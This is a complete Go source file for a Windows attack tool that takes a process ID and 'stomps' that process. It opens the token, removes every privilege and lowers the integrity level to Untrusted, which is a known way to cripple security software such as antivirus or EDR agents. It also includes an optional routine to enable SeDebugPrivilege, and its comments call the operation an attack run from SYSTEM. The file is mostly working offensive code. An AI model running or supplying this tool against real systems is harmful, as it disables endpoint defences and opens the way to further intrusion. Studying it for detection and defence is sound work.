package main

import (
	"flag"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modadvapi32             = windows.NewLazySystemDLL("advapi32.dll")
	procSetTokenInformation = modadvapi32.NewProc("SetTokenInformation")
)

func setSeDebugPrivilege() {
	log.Println("[*] Attempting to set SeDebugPrivilege in current process")
	handle, err := windows.GetCurrentProcess()
	defer windows.CloseHandle(handle)
	if err != nil {
		log.Fatal(err)
	}

	var token windows.Token
	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		log.Fatal(err)
	}
	defer token.Close()

	// Check the LUID
	var luid windows.LUID
	seDebugName, err := windows.UTF16FromString("SeDebugPrivilege")
	if err != nil {
		fmt.Println(err)
	}
	err = windows.LookupPrivilegeValue(nil, &seDebugName[0], &luid)
	if err != nil {
		log.Fatal(err)
	}

	// Modify the token
	var tokenPriviledges windows.Tokenprivileges
	tokenPriviledges.PrivilegeCount = 1
	tokenPriviledges.Privileges[0].Luid = luid
	tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	// Adjust token privs
	tokPrivLen := uint32(unsafe.Sizeof(tokenPriviledges))
	log.Println(fmt.Sprintf("[+] Current token length is: %d", tokPrivLen))
	err = windows.AdjustTokenPrivileges(token, false, &tokenPriviledges, tokPrivLen, nil, nil)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("[+] Debug Priviledge granted!")
}

func stompProccess(pid uint32) {
	log.Println("[*] Attempting to stomp PID:", pid)

	log.Println("[*] Getting handle on process with limited information")
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		log.Fatal(err)
	}
	defer windows.CloseHandle(hProcess)
	log.Println("[+] Handle obtained:", fmt.Sprintf("%08X", hProcess))

	var currentToken windows.Token
	log.Println("[*] Getting handle on process token")
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &currentToken)
	if err != nil {
		log.Fatal(err)
	}
	defer currentToken.Close()
	log.Println("[+] Handle obtained:", fmt.Sprintf("%08X", currentToken))

	log.Println("[*] Getting token length")
	var tokenLength uint32
	windows.GetTokenInformation(currentToken, windows.TokenPrivileges, nil, 0, &tokenLength)
	log.Println("[+] Got token length:", tokenLength)

	log.Println("[*] Getting token privileges")
	buffer := make([]byte, tokenLength)
	var bytesWritten uint32
	err = windows.GetTokenInformation(currentToken, windows.TokenPrivileges, &buffer[0], uint32(len(buffer)), &bytesWritten)
	if err != nil {
		log.Fatal(err)
	}
	if bytesWritten != tokenLength {
		log.Fatal("[!] GetTokenInformation returned incomplete data")
	}

	tokenPrivileges := (*windows.Tokenprivileges)(unsafe.Pointer(&buffer[0]))
	numPrivsRemaining := tokenPrivileges.PrivilegeCount
	log.Println("[+] Number of privileges found:", tokenPrivileges.PrivilegeCount)
	tokenPrivSlice := tokenPrivileges.AllPrivileges()

	for i := 0; i < len(tokenPrivSlice); i++ {

		var tokenPrivs windows.Tokenprivileges
		tokenPrivs.PrivilegeCount = 1

		// Set tokens luid to privilege removed
		tokenPrivs.Privileges[0].Luid = tokenPrivSlice[i].Luid
		tokenPrivs.Privileges[0].Attributes = windows.SE_PRIVILEGE_REMOVED

		// Adjust token privs
		tokPrivLen := uint32(unsafe.Sizeof(tokenPrivs))
		err = windows.AdjustTokenPrivileges(currentToken, false, &tokenPrivs, tokPrivLen, nil, nil)
		if err != nil {
			log.Fatal(err)
		}
		log.Println("[+] Privilege successfully removed!")
		numPrivsRemaining -= 1
		log.Println("[*] Number of privileges remaining:", numPrivsRemaining)
	}

	if numPrivsRemaining == 0 {
		log.Println("[+] All privileges successfully removed!")
	} else {
		log.Println("[!] Not all privileges were removed, an error may have occured!")
	}

	tml := &windows.Tokenmandatorylabel{}
	tml.Label.Attributes = windows.SE_GROUP_INTEGRITY

	untrustedSid, err := syscall.UTF16PtrFromString("S-1-16-0")
	if err != nil {
		log.Fatal(err)
	}
	log.Println("[+] Created UTF16 pointer from string S-1-16-0")

	err = windows.ConvertStringSidToSid(untrustedSid, &tml.Label.Sid)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("[+] Created untrusted SID")

	SetTokenInformation(currentToken, windows.TokenIntegrityLevel, uintptr(unsafe.Pointer(tml)), tml.Size())
	if err != nil {
		log.Fatal(err)
	}
	log.Println("[+] Set process token to untrusted!")
}

// couldn't use the windows.SetTokenInformation function because of the way the info is passed as a *byte
func SetTokenInformation(token windows.Token, infoClass uint32, info uintptr, infoLen uint32) (err error) {
	r1, _, err := syscall.Syscall6(procSetTokenInformation.Addr(), 4, uintptr(token), uintptr(infoClass), info, uintptr(infoLen), 0, 0)
	if r1 == 0 {
		return err
	}
	return
}

func main() {
	// Get process ID from CLI
	pid := flag.Int("pid", 0, "the pid of the process to stomp")
	flag.Parse()

	// This is likely not needed, from my testing i could only perfrom the attack from SYSTEM
	// setSeDebugPrivilege()

	// Begin stomping the process
	stompProccess(uint32(*pid))
}
